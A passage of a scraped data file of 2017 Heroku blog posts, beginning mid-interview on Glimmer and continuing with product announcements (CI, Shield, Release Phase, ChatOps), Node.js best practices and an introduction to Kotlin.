methods, and classes and so on. Now in Glimmer we have introduced something called \"track properties\", but more importantly in Glimmer, you don’t actually need any kind of annotation because your computed properties are just getters, which is built in the language. Of course, if you want to do change tracking like \"Hey, this computed property changed, how do I update the DOM?\" You have a very simple decorator. So you don’t have to have this weird Ember thing, you just do what's in the language. Jonan: Which is hopefully going to increase adoption. Tom: I hope so, yeah. Jonan: This is a common problem, not just in the JavaScript community. You're coming up with new frameworks and you're moving very quickly. JavaScript, in particular, is moving very quickly. It seems like every week, or month, there's some new tool that I would have to learn, right? Tom: Yeah. Jonan: Something new and each one of them has their own distinct syntax, constantly changing. If you keep moving the goal post, eventually people tire of it. I consider the approach you took with Glimmer to be a very mature approach, and I really appreciate the effort you put in to make that. Tom: I think when people see Glimmer, it's very easy for their reaction to be \"Oh, god, here comes another JavaScript library.\" What I hope is that people can look at our track record, and I hope we have some credibility with people, and see that, \"Hey, we're not just talking a big game here. We actually have a community that has gone back at least five years. And we have apps that are five years old that have migrated.\" So I just hope people can feel safe when they look at Glimmer. It checks all the checklists that you need to check in 2017, but it also comes with the same community and the same core team that really values stability, that values migration, that values convention. Jonan: And speed. Tom: Yeah, and speed. Jonan: I think speed is the real reward from Glimmer. You build something in Glimmer and you, somehow, have accomplished this impossible tradeoff where you have a fast render speed and a fast update speed. Tom: I think it's interesting too because, you know, this always happens with benchmarks. There's some suite of benchmarks that comes out, people become over-focused on one particular metric. Jonan: Right. Tom: In this case, the community, has really focused on, in the last year, initial render performance. Initial render performance is super, super important, but it's not always worth sacrificing updating performance. I think Glimmer has hit this really nice sweet spot where it’s not as absolutely fast as the fastest rendering library, in terms of initial rendering, but it blows away all the other rendering engines at updates. Being the absolute fastest at initial render is only so important, so long as the user notices. It's not worth sacrificing everything if your constant time is imperceptible to the human, and I'm really excited with that sweet spot that we've hit. Jonan: We were talking the other day at lunch about the fact that there are some pages where I really don’t mind a long load time. If I'm going to a dashboard for a product that I've already purchased, I'm gonna sit there and wait. Like, yeah, maybe it takes 10 seconds, right, and I'm gonna be super annoyed and think, \"Wow, why am I paying these people money?\" Right? But for some definition of fast, all things start to be equal, when we get down towards those lower numbers. Tom: That’s right and I think people conflate those. You know, it's easy to get in a Twitter flame war because I'm talking about my dashboard that people are gonna sit on all day. You're talking about this ecommerce site. If you don’t have a response in under 200 milliseconds, people are gonna bounce and you're not gonna make your money. So those are different categories. That being said, I really do believe in my heart that there is a future where you can build your big dashboard app and it doesn’t take forever to load if we make the tools really good. Jonan: Thank you so much for taking the time to talk to us today. I really appreciate it. Do you have anything else you wanna share? Last minute thoughts? Tom: Oh, I just cannot wait to take a vacation in Barbados for a week. Jonan: Tom, thank you so much for being here. Tom: Thank you, Jonan, and thank you, Terence. Terence: Thank you. ember javascript fastboot glimmer", "date": "2017-05-11,"},
{"website": "Heroku", "title": "Heroku CI Is Now Generally Available: Fast, Low Setup CI That’s Easy to Use", "author": ["Ike DeLorenzo"], "link": "https://blog.heroku.com/heroku-ci-now-available", "abstract": "Heroku CI Is Now Generally Available: Fast, Low Setup CI That’s Easy to Use Posted by Ike DeLorenzo May 18, 2017 Listen to this article Today we are proud to announce that Heroku CI, a low-configuration test runner for unit and browser testing that is tightly integrated with Heroku Pipelines, is now in General Availability. To build software with optimal feature release speed and quality, continuous integration (CI) is a popular and best practice, and is an essential part of a complete continuous delivery (CD) practice. As we have done for builds, deployments, and CD, Heroku CI dramatically improves the ease, experience, and function of CI. Now your energy can go into your apps, not your process. With today's addition of Heroku CI, Heroku now offers a complete CI/CD solution for developers in all of our officially supported languages: Node, Ruby, Java, Python, Go, Scala, PHP, and Clojure. As you would expect from Heroku, Heroku CI is simple, powerful, visual, and prescriptive. It is intended to provide the features and flexibility to be the complete CI solution for the vast majority of application development situations, serving use cases that range from small innovation teams , to large Enterprise projects. Easy to Setup and Use Configuration of Heroku CI is quite low (or none). There is no IT involved; Heroku CI is automatically available and coordinated for all apps in Heroku Pipelines. Just turn on Heroku CI for the Pipeline, and each push to GitHub will run your tests. Tests reside in the location that is the norm typical for each supported language, for example: test scripts in Go typically reside in the file named \"function_test.go\". These tests are executed automatically on each git push. So no learning curve is involved, and little reconfiguration is typically necessary when migrating to Heroku CI from Jenkins and other CI systems. For users who are also new to continuous delivery, we've made Heroku Pipelines set-up easier than ever with a straightforward 3-step setup that automatically creates and configures your review, development, staging, and production apps. All that's left is to click the \"Tests\" tab and turn on Heroku CI. Visual at Every Stage From setup, to running tests, to CI management, everything about Heroku CI is intended to be fully visual and intuitive -- even for users who are new to continuous integration. For each app, the status of the latest or currently running test run is shown clearly on the Pipelines page. Test actions are a click away, and fully available via the UI: re-run any test, run new tests against an arbitrary branch, search previous tests by branch or pull request, and see full detail for any previous test. And Heroku CI integrates seamlessly with GitHub - on every git push your tests run, allowing you to also see the test result within GitHub web or GitHub Desktop interfaces. CI users who want more granular control, direct debug access, and programmatic control of CI actions can use the CLI interface for Heroku CI . Power, Speed, and Flexibility For every test you run, Heroku CI creates and populates an ephemeral app environment that mirrors your Staging and Production environments. These CI apps are created automatically, and then destroyed immediately after test runs complete. All the add-ons, databases, and configurations your code requires are optimized for test speed, and parity with downstream environments. Over the beta period, we have been working with add-on partners to make sure the CI experience is fast and seamless. Setup and tear-down for each CI run happens in seconds. Because we use these ephemeral Heroku apps to run your tests, there is no queue time (as is common with many CI systems). Your tests run immediately, every time on dedicated Performance dynos. Across the thousands of participants in our public beta, most developers observed test runs completing significantly faster than expectations. Cost-effective We view CI as an essential part of effective development workflows, that is, part of good overall delivery process. Each CI-enabled Heroku Pipeline is charged just $10/month for an unlimited number of test runs. For each test run, dyno charges apply only for the duration of tests. We recommend and default to Performance-M dynos to power test runs, and you can specify other dyno sizes. Note that all charges are pro-rated per second, with no commitment, so you can try out Heroku CI for pennies -- usually with little modification to your existing test scripts. Enterprise-ready All Heroku Enterprise customers get unlimited CI-enabled Pipelines, and an unlimited number of test runs, all, of course, with zero queue time. No provisioning, authentication set-up, or management of CI is required for new projects, and Heroku CI can be turned on for any Heroku Pipeline with a single click. Existing Heroku Enterprise dyno credits are automatically used for test runs, and invoices will contain a new section listing the CI-enabled Pipelines alongside the account-wide dyno usage for CI test runs. All test run results are available at permanent URLs that can be referenced for compliance regimes, and all authentication is managed under existing Heroku Enterprise Teams (Org) security. Unification of security, authentication, billing between CI and production deployments, along with a prescriptive methodology across company projects, lets Enterprises innovate on Heroku with the agility of a start-up. Heroku-built, Community-hardened Some terms are not usually associated with CI systems: we think Heroku CI is among the most pleasant, beautiful software testing systems available -- and we have you to thank for this. More than 1500 beta users tested Heroku CI, surfacing bugs, offering suggestions; telling us that some webhooks got dropped, that an icon on the tab might be nice, that it should be more obvious how to re-run a test ... and roughly 600 other notes, many of which grew into e-mail conversations with you. As is the case with all software: we will still be perfecting. And we are pretty proud of what we have here. Thank you, and keep the comments coming! Get Started It's easy. Set-up a Heroku Pipeline and you're ready. There's even a two-minute video here and a simple how-to . Give it a spin, and let us know what you think. continuous integration Heroku Flow devops", "date": "2017-05-18,"},
{"website": "Heroku", "title": "Announcing Platform API for Partners ", "author": ["Nahid Samsami"], "link": "https://blog.heroku.com/platform-api-for-partners", "abstract": "Announcing Platform API for Partners Posted by Nahid Samsami May 25, 2017 Listen to this article Heroku has always made it easy for you to extend your apps with add-ons. Starting today, partners can access the Platform API to build a more secure and cohesive developer experience between add-ons and Heroku. Advancing the Add-on User Experience Several add-ons are already using the new Platform API for Partners. Adept Scale , a long-time add-on in our marketplace that provides automated scaling of Heroku dynos, has updated its integration to offer a stronger security stance, with properly scoped access to each app it is added to. Existing customer integrations have been updated as of Friday May 12th. All new installs of Adept Scale will use the more secure, scoped Platform API. Opbeat , a performance monitoring service for Node.js developers,  is using the Platform API in production to sync their user roles to match Heroku.  It is also synchronizing metadata, so that its data stays in sync with Heroku when users make changes, for instance renaming a Heroku app.  This connection enables a more cohesive experience between the two tools. We have a list of standard endpoints that partners can use documented in the Dev Center , with more functionality coming soon. For new integrations that may require additional endpoints, we ask partners to reach out to us directly about making specific endpoints from the Platform API available. Please contact us with information about your intended integration. As add-on partner adoption of the Platform API grows, Heroku customers can expect to see a more cohesive, reliable and secure developer experience when using add-ons, and a wider range of add-on offerings in our Elements marketplace . addons integration partner api", "date": "2017-05-25,"},
{"website": "Heroku", "title": "Announcing DNS Service Discovery for Heroku Private Spaces: Microservices Communication, Made Easy", "author": ["Brett Goulder"], "link": "https://blog.heroku.com/announcing-dns-service-discovery", "abstract": "Announcing DNS Service Discovery for Heroku Private Spaces: Microservices Communication, Made Easy Posted by Brett Goulder May 31, 2017 Listen to this article Today, we are excited to announce DNS Service Discovery for Heroku Private Spaces,  an easy way to find and coordinate services for  microservice-style deployments. As applications grow in sophistication and scale, developers often organize their applications into small, purpose-built “microservices”. These microservice systems act in unison to achieve what otherwise would be handled by a single, larger monolithic application, which serves the benefit of simplifying applications’ codebases and improving their overall reliability. DNS Service Discovery is a valuable component of a true microservices architecture. It is a simple, yet effective way to facilitate microservice-style application architecture on Private Spaces using standard DNS naming conventions. As a result, your applications can now know in advance how they should reach the other process types and services needed to do their job. How It Works DNS Service Discovery allows you to connect these services together by providing a naming scheme for finding individual dynos within your Private Space. Every process type for every application in the Space is configured to respond to a standard DNS name of the format <process-type>.<application-name>.app.localspace. Example: $ nslookup web.myapp.app.localspace\nweb.myapp.app.localspace. 0 IN A 10.10.10.11\nweb.myapp.app.localspace. 0 IN A 10.10.10.10\nweb.myapp.app.localspace. 0 IN A 10.10.10.9 This is enabled by default on all newly created applications in Private Spaces. For existing Private Spaces applications, you need to run: $ heroku features:enable spaces-dns-discovery --app <app name> When combined with Heroku Flow’s continuous delivery approach, the benefits of a microservices architecture are further realized. For example, in a distributed system, each application can have a smaller footprint and a more focused purpose - so when it comes time to push updates to this system, your team can modify and continuously deliver a single portion of your architecture, instead of having to cycle out the entirety of your application. And when your application’s traffic grows, you can scale up the just the portion of your system that requires extra cycles, resulting in a more flexible and economical use of resources. Learn More We’re excited to see the new possibilities Service Discovery opens up for microservices architectures. If you are interested in learning more about DNS Service Discovery for your applications in Private Spaces, please check out our Dev Center article or contact us with further questions. Private Spaces dns service discovery Heroku Enterprise", "date": "2017-05-31,"},
{"website": "Heroku", "title": "Introducing Heroku Shield: Continuous Delivery for High Compliance Apps", "author": ["Jesper Joergensen"], "link": "https://blog.heroku.com/announcing-heroku-shield", "abstract": "Introducing Heroku Shield: Continuous Delivery for High Compliance Apps Posted by Jesper Joergensen June 06, 2017 Listen to this article Today we are happy to announce Heroku Shield, a new addition to our Heroku Enterprise line of products. Heroku Shield introduces new capabilities to Dynos, Postgres databases and Private Spaces that make Heroku suitable for high compliance environments such as healthcare apps regulated by the Health Insurance Portability and Accountability Act (HIPAA). With Heroku Shield, the power and productivity of Heroku is now easily available to a whole new class of strictly regulated apps. At the core of Heroku’s products is the idea that developers can turn great ideas into successful customer experiences at a surprising pace when all unnecessary and irrelevant elements of application infrastructure are systematically abstracted away. The design of Heroku Shield started with the question: what if regulatory and compliance complexity could be transformed into a simple developer experience, just as has been done for infrastructure complexity? The outcome is a simple, elegant user experience that abstracts away compliance complexity while freeing development teams to use the tools and services they love in a new class of app. Heroku Shield is generally available to Heroku Enterprise customers. For more information about Heroku Enterprise, please contact us here . How it Works Shield Private Spaces To use Heroku Shield, start by creating a new Private Space and switch on the Shield option. The first thing you notice is that logging is now configured at the space level. With Private Space Logging , logs from all apps and control systems are automatically forwarded to the logging destination configured for the space. This greatly simplifies compliance auditing while still leaving the developers in full control of app configuration and deployment. Shield Private Spaces also adds a critical compliance feature to the heroku run command used by developers to access production apps for administrative and diagnostic tasks. In a Shield Private Space, all keystrokes typed in an interactive heroku run session are logged automatically. This meets a critical compliance requirement to audit all production access but without restricting developers from doing diagnostics and time sensitive remediation tasks directly on production environments. Shield Private Dynos and Postgres In a Shield Private Space you can create special Shield flavors of Dynos and Postgres databases. The Shield Private Dyno includes an encrypted ephemeral file system and restricts SSL termination from using TLS 1.0 which is considered vulnerable. Shield Private Postgres further guarantees that data is always encrypted in transit and at rest. Heroku also captures a high volume of security monitoring events for Shield dynos and databases which helps meet regulatory requirements without imposing any extra burden on developers. App Innovation for Healthcare and Beyond With Heroku Shield, you can now build healthcare apps on Heroku that are capable of handling protected health information (PHI) in compliance with the United States HIPAA framework. The healthcare industry is living proof of how challenging it is to modernize application delivery while meeting strict compliance requirements. All you have to do is compare the user experience of most healthcare apps with what you have come to expect from apps in less regulated industries like e-commerce, productivity and social networks. It's simply too hard to evolve and modernize healthcare apps today because they are delivered using outdated, rigid platforms and practices. At Heroku, we are doing our small part to change this by providing development teams a HIPAA-ready platform with the industry's best Continuous Delivery Experience . Of course, this is just a step on our trust journey - the work of providing more security and compliance capabilities is never complete.  We are already working on new capabilities and certifications for Heroku Shield, and as always look to our customers and the developer community for input on how to direct and prioritize those efforts. Summary The opportunity to combine developer creativity with the opportunities for innovation in high compliance industries is powerful and potent.  Heroku has had the privilege to see the possibilities that result from removing obstacles from developers, and with Shield, hope to see that promise amplified yet again.  For more information on Shield, see the Dev Center article here , or contact Heroku. Want to learn more about Heroku Shield? Contact sales Shield Heroku Enterprise Private Spaces HIPAA compliance healthcare", "date": "2017-06-06,"},
{"website": "Heroku", "title": "Announcing Release Phase: Automatically Run Tasks Before a New Release is Deployed", "author": ["Jon Byrum"], "link": "https://blog.heroku.com/announcing-release-phase-run-tasks-before-new-release-deployed", "abstract": "Announcing Release Phase: Automatically Run Tasks Before a New Release is Deployed Posted by Jon Byrum June 08, 2017 Listen to this article You’re using a continuous delivery pipeline because it takes the manual steps out of code deployment.  But when a release includes updates to a database schema, the deployment requires manual intervention and team coordination.  Typically, someone on the team will log into the database and run the migration, then quickly deploy the new code to production.  It's a process rife with deployment risk. Now with Release Phase, generally available today, you can define tasks you need to run before a release is deployed to production.  Simply push your code and Release Phase will automatically run your database schema migration, upload static assets to a CDN, or any other task your app needs to be ready for production.  If a Release Phase task fails, the new release is not deployed, leaving the production release unaffected. To get started, view the release phase documentation . A Release Phase Example Let’s say you have a Node.js app, using Sequelize as your ORM, and want to run a database migration on your next release.   Simply define a release command in your Procfile: release: node_modules/.bin/sequelize db:migrate\nweb: node ./bin/www When you run git push heroku master , after the build is successful, Release Phase begins the migration via a one-off dyno .  If the migration is successful, the app code is deployed to production.  If the migration fails, your release is not deployed and you can check your Release Phase logs to debug. $ git push heroku master\n... \nRunning release command….\n--- Migrating Db ---\nSequelize [Node: 7.9.0, CLI: 2.7.9, ORM: 3.30.4]\n\nLoaded configuration file \"config/config.json\".\nUsing environment \"production\".\n== 20170413204504-create-post: migrating ======\n== 20170413204504-create-post: migrated (0.054s)\n\nV23 successfully deployed Check out the video to watch it in action: Heroku Flow + Release Phase Heroku Flow provides you with a professional continuous delivery pipeline with dev, staging, and production environments.  When you promote a release from staging to production, Release Phase will automatically run your tasks in the production environment. With Heroku Flow you always knows where a particular feature is on the path to production.  Now -- with Release Phase -- the path to production has even fewer manual steps.", "date": "2017-06-08,"},
{"website": "Heroku", "title": "Habits of a Happy Node Hacker 2017", "author": ["Jeremy Morrell"], "link": "https://blog.heroku.com/node-habits-2017", "abstract": "Habits of a Happy Node Hacker 2017 Posted by Jeremy Morrell June 14, 2017 Listen to this article It’s been a little over a year since our last Happy Node Hackers post , and even in such a short time much has changed and some powerful new tools have been released. The Node.js ecosystem continues to mature and new best practices have emerged. Here are 8 habits for happy Node hackers updated for 2017. They're specifically for app developers , rather than module authors, since those groups have different goals and constraints: 1. Lock Down Your Dependency Tree In modern Node applications, your code is often only the tip of an iceberg. Even a small application could have thousands of lines of JavaScript hidden in node_modules . If your application specifies exact dependencies in package.json , the libraries you depend on probably don’t. Over time, you'll get slightly different code for each install, leading to unpredictability and potentially introducing bugs. In the past year Facebook surprised the Node world when it announced Yarn , a new package manager that let you use npm's vast registry of nearly half a million modules and featured a lockfile that saves the exact version of every module in your dependency tree. This means that you can be confident that the exact same code will be downloaded every time you deploy your application. Not to be outdone, npm released a new version with a lockfile of its own. Oh, and it's a lot faster now too. This means that whichever modern package manager you choose, you'll see a big improvement in install times and fewer errors in production. To get started with Yarn, install it and run yarn in your application’s directory. This will install your dependencies and generate a yarn.lock file which tells Heroku to use Yarn when building your application. To use npm 5, update locally by running npm install -g npm@latest and reinstall your application's dependencies by running rm -rf node_modules && npm install . The generated package-lock.json will let Heroku know to use npm 5 to install your modules. 2. Hook Things Up Lifecycle scripts make great hooks for automation. If you need to run something before building your app, you can use the preinstall script. Need to build assets with grunt, gulp, browserify, or webpack? Do it in the postinstall script. In package.json : \"scripts\": {\n  \"postinstall\": \"grunt build\",\n  \"start\": \"node app.js\"\n} You can also use environment variables to control these scripts: \"postinstall\": \"if $BUILD_ASSETS; then npm run build-assets; fi\",\n\"build-assets\": \"grunt build\" If your scripts start getting out of control, move them to files: \"postinstall\": \"scripts/postinstall.sh\" 3. Modernize Your JavaScript With the release of Node 8, the days of maintaining a complicated build system to write our application in ES2015, also known as ES6, are mostly behind us. Node is now 99% feature complete with the ES2015 spec , which means you can use new features such as template literals or destructuring assignment with no ceremony or build process! const combinations = [\n  { number: \"8.0.0\", platform: \"linux-x64\" },\n  { number: \"8.0.0\", platform: \"darwin-x64\" },\n  { number: \"7.9.0\", platform: \"linux-x64\" },\n  { number: \"7.9.0\", platform: \"darwin-x64\" }\n];\n\nfor (let { number, platform } of combinations) {\n  console.log(`node-v${number}-${platform}.tar.gz`);\n} There are a ton of additions , and overall they work together to significantly increase the legibility of JavaScript and make your code more expressive. 4. Keep Your Promises Beyond ES2015, Node 8 supports the long-awaited async and await keywords without opting in to experimental features. This feature builds on top of Promise s allowing you to write asynchronous code that looks like synchronous code and has the same error handling semantics, making it easier to write, easier to understand, and safer. You can re-write nested callback code that looks like this: function getPhotos(fn) {\n  getUsers((err, users) => {\n    if (err) return fn(err);\n    getAlbums(users, (err, albums) => {\n      if (err) return fn(err);\n      getPhotosForAlbums(albums, (err, photos) => {\n        if (err) return fn(err);\n        fn(null, photos);\n      });\n    });\n  });\n} into code that reads top-down instead of inside-out: async function getPhotos() {\n  const users = await getUsers();\n  const albums = await getAlbums(users);\n  return getPhotosForAlbums(albums);\n} You can call await on any call that returns a Promise . If you have functions that still expect callbacks, Node 8 ships with util.promisify which can automatically turn a function written in the callback style into a function that can be used with await . 5. Automate Your Code Formatting with Prettier We’ve all collectively spent too much time formatting code, adding a space here, aligning a comment there, and we all do it slightly different than our teammate two desks down. This leads to endless debates about where the semicolon goes or whether we should use semicolons at all. Prettier is an open source tool that promises to finally eliminate those pointless arguments for good. You can write your code in any style you like, and with one command it’s all formatted consistently. That may sound like a small thing but freeing yourself from arranging whitespace quickly feels liberating. Prettier was only released a few months ago, but it's already been adopted by Babel, React, Khan Academy, Bloomberg, and more ! If you hate writing semicolons, let Prettier add them for you, or your whole team can banish them forever with the --no-semi option. Prettier supports ES2015 and Flow syntax, and the recent 1.4.0 release added support for CSS and TypeScript as well . There are integrations with all major text editors, but we recommend setting it up as a pre-commit hook or with a lifecycle script in package.json . \"scripts\": {\n  \"prettify\": \"prettier --write 'src/**/*.js'\"\n} 6. Test Continuously Pushing out a new feature and finding out that you've broken the production application is a terrible feeling. You can avoid this mistake if you’re diligent about writing tests for the code you write, but it can take a lot of time to write a good test suite. Besides, that feature needs to be shipped yesterday, and this is only a first version. Why write tests that will only have to be re-written next week? Writing unit tests in a framework like Mocha or Jest is one of the best ways of making sure that your JavaScript code is robust and well-designed. However there is a lot of code that may not justify the time investment of an extensive test suite. The testing library Jest has a feature called Snapshot Testing that can help you get insight and visibility into code that would otherwise go untested. Instead of deciding ahead of time what the expected output of a function call should be and writing a test around it, Jest will save the actual output into a local file on the first run, and then compare it to the response on the next run and alert you if it's changed. While this won't tell you if your code is working exactly as you'd planned when you wrote it, this does allow you to observe what changes you're actually introducing into your application as you move quickly and develop new features. When the output changes you can quickly update the snapshots with a command, and they will be checked into your git history along with your code. it(\"test /endpoint\", async () => {\n  const res = await request(`http://0.0.0.0:5000/endpoint`);\n  const body = await res.json();\n  const { status, headers } = res;\n  expect({ status, body, headers }).toMatchSnapshot();\n}); Example Repo Once you've tested your code, setting up a good CI workflow is one way of making sure that it stays tested. To that end, we launched Heroku CI . It’s built into the Heroku continuous delivery workflow , and you'll never wait for a queue. Check it out! Don't need the fancy features and just want a super simple test runner? Check\nout tape for your minimal testing needs. 7. Wear Your Helmet For web application security, a lot of the important yet easy configuration to lock down a given app can be done by returning the right HTTP headers. You won't get most of these headers with a default Express application, so if you want to put an application in production with Express, you can go pretty far by using Helmet . Helmet is an Express middleware module for securing your app mainly via HTTP headers. Helmet helps you prevent cross-site scripting attacks, protect against click-jacking, and more! It takes just a few lines to add basic security to an existing express application: const express = require('express');\nconst helmet = require('helmet');\n\nconst app = express();\n\napp.use(helmet()); Read more about Helmet and other Express security best practices 8. HTTPS all the things By using private connections by default, we make it the norm, and everyone is safer. As web engineers, there is no reason we shouldn’t default all traffic in our applications to using HTTPS. In an express application, there are several things you need to do to make sure you're serving your site over https . First, make sure the Strict-Transport-Security header (often abbreviated as HSTS ) is set on the response. This instructs the browser to always send requests over https . If you’re using Helmet, then this is already done for you ! Then make sure that you're redirecting any http requests that do make it to the server to the same url over https . The express-enforce-ssl middleware provides an easy way to do this. const express = require('express');\nconst expressEnforcesSSL = require('express-enforces-ssl');\n\nconst app = express();\n\napp.enable('trust proxy');\napp.use(expressEnforcesSSL()); Additionally you'll need a TLS certificate from a Certificate Authority. But if you are deploying your application to Heroku and using any hobby or professional dyno, you will automatically get TLS certificates set up through Let’s Encrypt for your custom domains by our Automated Certificate Management – and for applications without a custom domain, we provide a wildcard certificate for *.herokuapp.com . What are your habits? I try to follow these habits in all of my projects. Whether you’re new to node or a server-side JS veteran, I’m sure you’ve developed tricks of your own. We’d\nlove to hear them! Share your habits by tweeting with the #node_habits hashtag. Happy hacking! es6 es7 es2015 npm yarn node javascript", "date": "2017-06-14,"},
{"website": "Heroku", "title": "On the Rise of Kotlin", "author": ["Joe Kutner"], "link": "https://blog.heroku.com/rise-of-kotlin", "abstract": "On the Rise of Kotlin Posted by Joe Kutner June 20, 2017 Listen to this article It’s rare when a highly structured language with fairly strict syntax sparks emotions of joy and delight. But Kotlin, which is statically typed and compiled like other less friendly languages, delivers a developer experience that thousands of mobile and web programmers are falling in love with. The designers of Kotlin, who have years of experience with developer tooling (IntelliJ and other IDEs), created a language with very specific developer-oriented requirements. They wanted a modern syntax, fast compile times, and advanced concurrency constructs while taking advantage of the robust performance and reliability of the JVM. The result, Kotlin 1.0, was released in February 2016 and its trajectory since then has been remarkable. Google recently announced official support for Kotlin on Android , and many server-side technologies have introduced Kotlin as a feature. The Spring community announced support for Kotlin in Spring Framework 5.0 last month and the Vert.x web server has worked with Kotlin for over a year . Kotlin integrates with most existing web applications and frameworks out-of-the-box because it's fully interoperable with Java, making it easy to use your favorite libraries and tools. But ultimately, Kotlin is winning developers over because it’s a great language. Let’s take a look at why it makes us so happy. A Quick Look at Kotlin The first thing you’ll notice about Kotlin is how streamlined it is compared to Java. Its syntax borrows from languages like Groovy and Scala, which reduce boilerplate by making semicolons optional as statement terminators, simplifying for loops, and adding support for string templating among other things. A simple example in Kotlin is adding two numbers inside of a string like this: val sum: String = \"sum of $a and $b is ${a + b}\" The val keyword is a feature borrowed from Scala. It defines an read-only variable, which in this case is explicitly typed as a String . But Kotlin can also infer that type. For example, you could write: val x = 5 In this case, the type Int is inferred by the compiler. That’s not to say the type is dynamic though. Kotlin is statically typed, but it uses type inference to reduce boilerplate. Like many of the JVM languages it borrows from, Kotlin makes it easier to use functions and lambdas. For example, you can filter a list by passing it an anonymous function as a predicate: val positives = list.filter { it > 0 } The it variable in the function body references the first argument to the function by convention. This is borrowed from Groovy, and eliminates the boilerplate of defining parameters. You can also define named functions with the fun keyword. The following example creates a function with default arguments, another great Kotlin feature that cleans up your code: fun printName(name: String = \"John Doe\") {\n  println(name);\n} But Kotlin does more than borrow from other languages. It introduces new capabilities that other JVM languages lack. Most notable are null safety and coroutines. Null safety means that a Kotlin variable cannot be set to null unless it is explicitly defined as a nullable variable. For example, the following code would generate a compiler error: val message: String = null But if you add a ? to the type, it becomes nullable. Thus, the following code is valid to the compiler: val message: String? = null Null safety is a small but powerful feature that prevents numerous runtime errors in your applications. Coroutines, on the other hand, are more than just syntactic sugar. Coroutines are chunks of code that can be suspended to prevent blocking a thread of execution, which greatly simplifies asynchronous programming. For example, the following program starts 100,000 coroutines using the launch function. The body of the coroutine can be paused at a suspension point so the main thread of execution can perform some other work while it waits: fun main(args: Array<String>) = runBlocking<Unit> {\n  var number = 0\n  val random = Random()\n  val jobs = List(100_000) {\n    launch(CommonPool) {\n      delay(10)\n      number += random.nextInt(100)\n    }\n  }\n  jobs.forEach { it.join() }\n  println(\"The answer is: $number\")\n} The suspension point is the delay call. Otherwise, the function simply calculates some random number and renders it. Coroutines are still an experimental feature in Kotlin 1.1, but early adopters can use them in their applications today. Despite all of these great examples, the most important feature of Kotlin is its ability to integrate seamlessly with Java. You can mix Kotlin code into an application that’s already based on Java, and you can consume Java APIs from Kotlin with ease, which smooths the transition and provides a solid foundation. Kotlin Sits on the Shoulders of Giants Behind every successful technology is a strong ecosystem. Without the right tools and community, a new programming language will never achieve the uptake required to become a success. That’s why it’s so important that Kotlin is built into the Java ecosystem rather than outside of it. Kotlin works seamlessly with Maven and Gradle, which are two of the most reliable and mature build tools in the industry. Unlike other programming languages that attempted to separate from the JVM ecosystem by reinventing dependency management, Kotlin is leveraging the virtues of Java for it's tooling. There are attempts to create Kotlin-based build tools , which would be a great addition to the Kotlin ecosystem, but they aren't a prerequisite for being productive with the language. Kotlin also works seamlessly with popular JVM web frameworks like Spring and Vert.x. You can even create a new Kotlin-based Spring Boot application from the Spring Initializer web app . There has been a huge increase in adoption of Kotlin for apps generated this way. Kotlin has great IDE support too, thanks to it's creators. The best way to learn Kotlin is by pasting some Java code into IntelliJ and allowing the IDE to convert it to Kotlin code for you. All of these pieces come together to make a recipe for success. Kotlin is poised to attract both new and old Java developers because it's built on solid ground. If you want to see how well Kotlin fits into existing Java tooling, try deploying a sample Kotlin application on Heroku using our Getting Started with Kotlin guide . If you're familiar with Heroku, you'll notice that it looks a lot like deploying any other Java-based application on our platform, which helps make the learning curve for Kotlin relatively flat. But why should you learn Kotlin? Why Kotlin? Heroku already supports five JVM languages that cover nearly every programming language paradigm in existence. Do we need another JVM Language? Yes. We need Kotlin as an alternative to Java just as we needed Java as an alternative to C twenty years ago. Our existing JVM languages are great, but none of them have demonstrated the potential to become the de facto language of choice for a large percentage of JVM developers. Kotlin has learned from the JVM languages that preceded it and borrowed the best parts from those ecosystems. The result is a well round, powerful, and production-ready platform for your apps. Kotlin", "date": "2017-06-20,"},
{"website": "Heroku", "title": "Announcing Heroku ChatOps for Slack", "author": ["Michelle Peot"], "link": "https://blog.heroku.com/chatops-ga", "abstract": "Announcing Heroku ChatOps for Slack Posted by Michelle Peot July 25, 2017 Listen to this article Today we’re making our Slack integration generally available to all Heroku customers through the release of Heroku ChatOps. ChatOps is transforming the way dev teams work, replacing the asynchronous communication and context-switching of traditional operations processes with a shared conversational environment so teams can stay focused, communicate in real-time, gain visibility, and speed joint decision making. Having seen the benefits of Slack integration for managing our own apps, we wanted to make ChatOps easier to use and accessible to every dev team. Heroku ChatOps handles the complexity of user onboarding, authentication, and accountability between Slack & Heroku, and provides users with an intuitive slash command interface and curated Slack notifications to improve your team’s efficiency and transparency. Heroku ChatOps is easy to set up and works out of the box with just a simple click installation. Our initial release supports the integration of Heroku’s popular Pipelines continuous delivery workflow with Slack. This means you can deploy and promote pipeline apps, and keep informed of your team’s releases and integration test status without ever leaving Slack. Getting Started We made ChatOps simple to install using a one-click command from the Dev Center page .  Team members can then seamlessly authenticate from Slack with their GitHub and Heroku accounts via OAuth. Heroku Flow and Team Ready We designed ChatOps with teams and Heroku Flow -- a visual, easy to use workflow for continuous delivery -- in mind. All of your team’s Heroku Pipelines are visible and available for managing from within your team’s Slack channel. ChatOps allows your team to have shared visibility and collaborate effectively on continuous delivery workflows from within Slack. Proactive Notifications ChatOps unifies monitoring of your continuous delivery workflow by creating proactive notifications in Slack for Heroku Pipelines associated events like pull request openings, Heroku CI activity, or Dashboard -initiated deployments and promotions. No more looking through multiple emails, activity logs, or forwarding notifications -- everyone sees the same thing immediately in the same place. Slash Commands for Collaborative Deployment ChatOps brings the deployment processes that are happening behind the scenes on a single engineer’s laptop to the forefront, using a set of slash commands to help manage the delivery of your Heroku applications from inside of Slack. You can deploy to apps in any stage of your team’s pipeline or promote to production directly from within Slack. Output from deployment and pipeline promotion commands are organized into threads to keep things tidy.  ChatOps will alert you if a required deployment check failed with a user-friendly error message.  You also have the option of ignoring the check failure and forcing a deploy. Pipeline configuration details and release history are also readily available. Learn More Installation instructions and the full list of commands are available in our Dev Center documentation .  More details how we built our Slack integration are available on the Slack Platform Blog . chatops slack Pipelines notifications", "date": "2017-07-25,"},
